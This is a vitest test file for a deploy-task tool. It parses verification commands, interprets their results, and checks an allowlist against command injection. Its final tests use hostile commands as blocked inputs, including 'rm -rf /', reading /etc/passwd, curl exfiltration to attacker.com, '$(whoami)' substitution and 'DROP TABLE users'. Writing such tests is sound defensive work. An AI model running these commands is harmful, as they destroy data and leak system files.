import { describe, it, expect } from 'vitest';
import { extractVerifyCommand, extractCategory, interpretResult } from '../detect.ts';
import { isAllowedCommand } from '../../../commands/deploy-tasks.ts';

// ────────────────────────────────────────────────────────────────────────────
// extractVerifyCommand
// ────────────────────────────────────────────────────────────────────────────

describe('extractVerifyCommand', () => {
  it('extracts command from standard task text', () => {
    const text =
      '`ci` Modified workflow "render monitor" — verify it runs successfully after merge — `gh run list --workflow="render-monitor.yml" --limit=1 --json status,conclusion`';
    expect(extractVerifyCommand(text)).toBe(
      'gh run list --workflow="render-monitor.yml" --limit=1 --json status,conclusion'
    );
  });

  it('extracts command with PR reference suffix', () => {
    const text =
      '`ci` New workflow "e2e pr" — verify it runs successfully after merge — `gh run list --workflow="e2e-pr.yml" --limit=1 --json status,conclusion` _(from PR #3838)_';
    expect(extractVerifyCommand(text)).toBe(
      'gh run list --workflow="e2e-pr.yml" --limit=1 --json status,conclusion'
    );
  });

  it('extracts psql migration command', () => {
    const text =
      '`migration` Verify migration 0158 applied on server start — `psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 5;"`';
    expect(extractVerifyCommand(text)).toBe(
      'psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 5;"'
    );
  });

  it('extracts curl health check command', () => {
    const text =
      '`schema` Drizzle schema changed — verify wiki-server redeployed and schema is in sync — `curl -sf "$WIKI_SERVER_URL/health" | jq .`';
    expect(extractVerifyCommand(text)).toBe('curl -sf "$WIKI_SERVER_URL/health" | jq .');
  });

  it('extracts curl route check command', () => {
    const text =
      '`route` New route "things" — verify it responds — `curl -sf "$WIKI_SERVER_URL/things" -o /dev/null -w "%{http_code}"`';
    expect(extractVerifyCommand(text)).toBe(
      'curl -sf "$WIKI_SERVER_URL/things" -o /dev/null -w "%{http_code}"'
    );
  });

  it('returns null for task without verification command', () => {
    const text = '`env` Set `NEW_API_KEY` in production environment';
    expect(extractVerifyCommand(text)).toBeNull();
  });

  it('returns null for empty string', () => {
    expect(extractVerifyCommand('')).toBeNull();
  });

  it('returns null for text with em-dash but no backtick command', () => {
    const text = '`manual` Run the data backfill script — see PR description for details';
    expect(extractVerifyCommand(text)).toBeNull();
  });

  it('handles migration command with PR ref suffix', () => {
    const text =
      '`migration` Verify migration 0158 applied on server start — `psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 5;"` _(from PR #3788)_';
    expect(extractVerifyCommand(text)).toBe(
      'psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 5;"'
    );
  });
});

// ────────────────────────────────────────────────────────────────────────────
// extractCategory
// ────────────────────────────────────────────────────────────────────────────

describe('extractCategory', () => {
  it('extracts "ci" category', () => {
    expect(extractCategory('`ci` Modified workflow "render monitor"')).toBe('ci');
  });

  it('extracts "migration" category', () => {
    expect(extractCategory('`migration` Verify migration 0158 applied')).toBe('migration');
  });

  it('extracts "schema" category', () => {
    expect(extractCategory('`schema` Drizzle schema changed')).toBe('schema');
  });

  it('extracts "env" category', () => {
    expect(extractCategory('`env` Set NEW_API_KEY in production')).toBe('env');
  });

  it('extracts "manual-migration" category (hyphenated)', () => {
    expect(extractCategory('`manual-migration` Run backfill script')).toBe('manual-migration');
  });

  it('extracts "route" category', () => {
    expect(extractCategory('`route` New route "things"')).toBe('route');
  });

  it('extracts "config" category', () => {
    expect(extractCategory('`config` Updated vercel.json')).toBe('config');
  });

  it('returns "unknown" for text without category prefix', () => {
    expect(extractCategory('Some task without category')).toBe('unknown');
  });

  it('returns "unknown" for empty string', () => {
    expect(extractCategory('')).toBe('unknown');
  });
});

// ────────────────────────────────────────────────────────────────────────────
// interpretResult — CI workflow checks
// ────────────────────────────────────────────────────────────────────────────

describe('interpretResult — CI workflows', () => {
  const ciCmd = 'gh run list --workflow="e2e-pr.yml" --limit=1 --json status,conclusion';

  it('passes when workflow succeeded', () => {
    const result = interpretResult('ci', ciCmd, {
      ok: true,
      stdout: '[{"status":"completed","conclusion":"success"}]',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('workflow succeeded');
  });

  it('fails when workflow failed', () => {
    const result = interpretResult('ci', ciCmd, {
      ok: true,
      stdout: '[{"status":"completed","conclusion":"failure"}]',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('workflow failed');
  });

  it('fails when workflow still running', () => {
    const result = interpretResult('ci', ciCmd, {
      ok: true,
      stdout: '[{"status":"in_progress","conclusion":""}]',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('workflow still running');
  });

  it('fails when workflow queued', () => {
    const result = interpretResult('ci', ciCmd, {
      ok: true,
      stdout: '[{"status":"queued","conclusion":""}]',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('workflow still running');
  });

  it('fails with unexpected output', () => {
    const result = interpretResult('ci', ciCmd, {
      ok: true,
      stdout: '[]',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toContain('unexpected output');
  });

  it('also matches gh run view commands', () => {
    const viewCmd = 'gh run view 12345 --json status,conclusion';
    const result = interpretResult('ci', viewCmd, {
      ok: true,
      stdout: '{"status":"completed","conclusion":"success"}',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('workflow succeeded');
  });
});

// ────────────────────────────────────────────────────────────────────────────
// interpretResult — health endpoint checks
// ────────────────────────────────────────────────────────────────────────────

describe('interpretResult — health checks', () => {
  const healthCmd = 'curl -sf "$WIKI_SERVER_URL/health" | jq .';

  it('passes when server is healthy', () => {
    const result = interpretResult('schema', healthCmd, {
      ok: true,
      stdout: '{"status":"healthy","database":"ok"}',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('healthy');
  });

  it('passes when output contains "ok"', () => {
    const result = interpretResult('schema', healthCmd, {
      ok: true,
      stdout: '{"status":"ok"}',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('healthy');
  });

  it('fails when server is degraded', () => {
    const result = interpretResult('schema', healthCmd, {
      ok: true,
      stdout: '{"status":"degraded","migrationError":"migration 0158 failed"}',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('server in degraded mode');
  });

  it('fails on unknown health status (starting, maintenance, etc.)', () => {
    const result = interpretResult('schema', healthCmd, {
      ok: true,
      stdout: '{"status":"starting"}',
      stderr: '',
      code: 0,
    });
    // Unknown status should NOT pass — operator needs to investigate
    expect(result.passed).toBe(false);
    expect(result.summary).toContain('starting');
  });
});

// ────────────────────────────────────────────────────────────────────────────
// interpretResult — migration checks
// ────────────────────────────────────────────────────────────────────────────

describe('interpretResult — migration checks', () => {
  const migrationCmd =
    'psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 5;"';

  it('passes when psql query succeeds', () => {
    const result = interpretResult('migration', migrationCmd, {
      ok: true,
      stdout: ' id | hash | created_at\n----+------+---\n 158 | abc | 2026-04-05',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
  });

  it('fails with helpful message when psql not found', () => {
    const result = interpretResult('migration', migrationCmd, {
      ok: false,
      stdout: '',
      stderr: '/bin/sh: psql: command not found',
      code: 127,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toContain('psql not available locally');
    expect(result.summary).toContain('health endpoint');
  });

  it('fails when psql connection fails', () => {
    const result = interpretResult('migration', migrationCmd, {
      ok: false,
      stdout: '',
      stderr: 'psql: error: connection to server failed',
      code: 2,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toContain('connection to server failed');
  });
});

// ────────────────────────────────────────────────────────────────────────────
// interpretResult — HTTP status checks
// ────────────────────────────────────────────────────────────────────────────

describe('interpretResult — HTTP status checks', () => {
  const httpCmd = 'curl -sf "$WIKI_SERVER_URL/things" -o /dev/null -w "%{http_code}"';

  it('passes on HTTP 200', () => {
    const result = interpretResult('route', httpCmd, {
      ok: true,
      stdout: '200',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('HTTP 200');
  });

  it('passes on HTTP 201', () => {
    const result = interpretResult('route', httpCmd, {
      ok: true,
      stdout: '201',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('HTTP 201');
  });

  it('fails on HTTP 404', () => {
    const result = interpretResult('route', httpCmd, {
      ok: true,
      stdout: '404',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('HTTP 404');
  });

  it('fails on HTTP 500', () => {
    const result = interpretResult('route', httpCmd, {
      ok: true,
      stdout: '500',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('HTTP 500');
  });
});

// ────────────────────────────────────────────────────────────────────────────
// interpretResult — generic / edge cases
// ────────────────────────────────────────────────────────────────────────────

describe('interpretResult — generic commands', () => {
  it('passes when command exits 0', () => {
    const result = interpretResult('build', 'pnpm build-data:content', {
      ok: true,
      stdout: 'Build data OK',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('Build data OK');
  });

  it('fails when command exits non-zero', () => {
    const result = interpretResult('build', 'pnpm build-data:content', {
      ok: false,
      stdout: 'Error: missing file',
      stderr: '',
      code: 1,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('Error: missing file');
  });

  it('reports stderr when command fails with no stdout', () => {
    const result = interpretResult('unknown', 'some-command', {
      ok: false,
      stdout: '',
      stderr: 'Permission denied',
      code: 1,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('Permission denied');
  });

  it('reports exit code when no output at all', () => {
    const result = interpretResult('unknown', 'some-command', {
      ok: false,
      stdout: '',
      stderr: '',
      code: 137,
    });
    expect(result.passed).toBe(false);
    expect(result.summary).toBe('exit code 137');
  });

  it('truncates long output to 120 chars', () => {
    const longOutput = 'A'.repeat(200);
    const result = interpretResult('build', 'pnpm build', {
      ok: true,
      stdout: longOutput,
      stderr: '',
      code: 0,
    });
    expect(result.summary.length).toBe(120);
  });

  it('returns "ok" when stdout is empty and command succeeds', () => {
    const result = interpretResult('config', 'echo done', {
      ok: true,
      stdout: '',
      stderr: '',
      code: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.summary).toBe('ok');
  });
});

// ────────────────────────────────────────────────────────────────────────────
// isAllowedCommand — command injection prevention
// ────────────────────────────────────────────────────────────────────────────

describe('isAllowedCommand', () => {
  // Allowed commands (generated by detection rules in detect.ts)
  it('allows CI workflow check commands', () => {
    expect(isAllowedCommand('gh run list --workflow="e2e-pr.yml" --limit=1 --json status,conclusion')).toBe(true);
    expect(isAllowedCommand('gh run list --workflow="render-monitor.yml" --limit=1 --json status,conclusion')).toBe(true);
    expect(isAllowedCommand('gh run list --workflow="e2e-post-deploy.yml" --limit=1 --json status,conclusion')).toBe(true);
    expect(isAllowedCommand('gh run list --workflow="wiki-server-docker.yml" --limit=1 --json status,conclusion')).toBe(true);
  });

  it('allows health endpoint check', () => {
    expect(isAllowedCommand('curl -sf "$WIKI_SERVER_URL/health" | jq .')).toBe(true);
  });

  it('allows migration check', () => {
    expect(isAllowedCommand('psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 5;"')).toBe(true);
    expect(isAllowedCommand('psql "$DATABASE_URL" -c "SELECT * FROM drizzle.__drizzle_migrations ORDER BY created_at DESC LIMIT 10;"')).toBe(true);
  });

  it('allows route check', () => {
    expect(isAllowedCommand('curl -sf "$WIKI_SERVER_URL/things" -o /dev/null -w "%{http_code}"')).toBe(true);
    expect(isAllowedCommand('curl -sf "$WIKI_SERVER_URL/api/facts" -o /dev/null -w "%{http_code}"')).toBe(true);
  });

  it('allows build check', () => {
    expect(isAllowedCommand('pnpm build-data:content && echo "Build data OK"')).toBe(true);
  });

  // Blocked commands (injection attempts)
  it('blocks arbitrary shell commands', () => {
    expect(isAllowedCommand('rm -rf /')).toBe(false);
    expect(isAllowedCommand('echo pwned')).toBe(false);
    expect(isAllowedCommand('cat /etc/passwd')).toBe(false);
  });

  it('blocks command chaining via semicolons', () => {
    expect(isAllowedCommand('gh run list --workflow="e2e-pr.yml" --limit=1 --json status,conclusion; rm -rf /')).toBe(false);
  });

  it('blocks command chaining via &&', () => {
    expect(isAllowedCommand('curl -sf "$WIKI_SERVER_URL/health" | jq . && curl attacker.com')).toBe(false);
  });

  it('blocks command substitution in workflow names', () => {
    expect(isAllowedCommand('gh run list --workflow="$(whoami).yml" --limit=1 --json status,conclusion')).toBe(false);
  });

  it('blocks path traversal in route checks', () => {
    expect(isAllowedCommand('curl -sf "$WIKI_SERVER_URL/../../etc/passwd" -o /dev/null -w "%{http_code}"')).toBe(false);
  });

  it('blocks exfiltration via curl', () => {
    expect(isAllowedCommand('curl https://attacker.com/steal?data=$(cat /etc/passwd)')).toBe(false);
  });

  it('blocks modified migration commands', () => {
    expect(isAllowedCommand('psql "$DATABASE_URL" -c "DROP TABLE users;"')).toBe(false);
  });

  it('blocks pipe injection in health checks', () => {
    expect(isAllowedCommand('curl -sf "$WIKI_SERVER_URL/health" | jq . | curl attacker.com')).toBe(false);
  });

  it('blocks empty commands', () => {
    expect(isAllowedCommand('')).toBe(false);
  });
});
